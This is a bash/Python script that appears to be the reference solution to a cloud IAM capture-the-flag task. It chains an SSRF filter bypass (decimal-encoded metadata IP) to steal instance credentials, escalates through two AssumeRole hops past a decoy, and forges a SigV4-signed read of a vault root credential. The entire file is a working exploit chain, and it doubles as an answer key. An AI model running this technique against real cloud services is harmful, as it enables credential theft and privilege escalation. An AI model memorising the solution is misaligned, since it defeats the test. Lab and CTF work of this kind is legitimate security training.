#!/usr/bin/env bash
set -euo pipefail

# Kelpie (cloud/IAM, nested decoy + SigV4 gate): SSRF (decimal-IP bypass) -> metadata -> webapp-role.
# AssumeRole -> admin-role; reading the admin artifact (artifacts/release-marker) via a plain GET gives
# a real-looking DECOY. The REAL flag needs ONE MORE hop (admin -> backup-role) AND a correctly
# computed AWS-SigV4 signature (per /docs/signing) over the vault read, using backup-role's temporary
# SecretAccessKey -- an unsigned/mis-signed read is refused with no distinguishing feedback. Pure stdlib.

python3 - <<'PY'
import hashlib, hmac, json, urllib.parse, urllib.request, urllib.error

BASE = "http://target:8247"


def get(path):
    try:
        return json.loads(urllib.request.urlopen(BASE + path, timeout=30).read())
    except urllib.error.HTTPError as e:
        return json.loads(e.read())


def post(path, **form):
    data = "&".join(f"{k}={urllib.parse.quote(str(v))}" for k, v in form.items()).encode()
    req = urllib.request.Request(BASE + path, data=data,
                                 headers={"Content-Type": "application/x-www-form-urlencoded"})
    try:
        return json.loads(urllib.request.urlopen(req, timeout=30).read())
    except urllib.error.HTTPError as e:
        return json.loads(e.read())


def sigv4(sk, ak, date, obj, region, service):               # exactly per /docs/signing
    def H(key, msg): return hmac.new(key, msg.encode(), hashlib.sha256).digest()
    k = H(("AWS4" + sk).encode(), date)
    k = H(k, region); k = H(k, service); k = H(k, "aws4_request")
    canonical = f"GET\n/s3/get\nobj={obj}\n{ak}\n{date}"
    sts = (f"AWS4-HMAC-SHA256\n{date}\n{region}/{service}/aws4_request\n"
           + hashlib.sha256(canonical.encode()).hexdigest())
    return hmac.new(k, sts.encode(), hashlib.sha256).hexdigest()


DEC = "2852039166"                                            # 169.254.169.254 as decimal
web = get("/fetch?url=" + urllib.parse.quote(f"http://{DEC}/latest/meta-data/iam/security-credentials/webapp-role", safe=""))
tok = web["Token"]

# obvious hop -> admin-role (its artifact is a decoy); then the SECOND hop -> backup-role for the vault
adm = post("/sts/assume-role", token=tok, role="admin-role")["Token"]
bak = post("/sts/assume-role", token=adm, role="backup-role")
btok, ak, sk = bak["Token"], bak["AccessKeyId"], bak["SecretAccessKey"]

doc = get("/docs/signing"); region, service = doc["region"], doc["service"]
obj, date = "vault/root-credential", "20250101"
sig = sigv4(sk, ak, date, obj, region, service)
resp = get(f"/s3/get?token={btok}&obj={urllib.parse.quote(obj)}&access_key={ak}&date={date}&sig={sig}")
flag = resp["body"]

with open("/app/flags.txt", "w") as f:
    f.write(flag.strip() + "\n")
print("assumed admin->backup, SigV4-signed the vault read (admin artifact was a decoy), flag:", flag)
PY
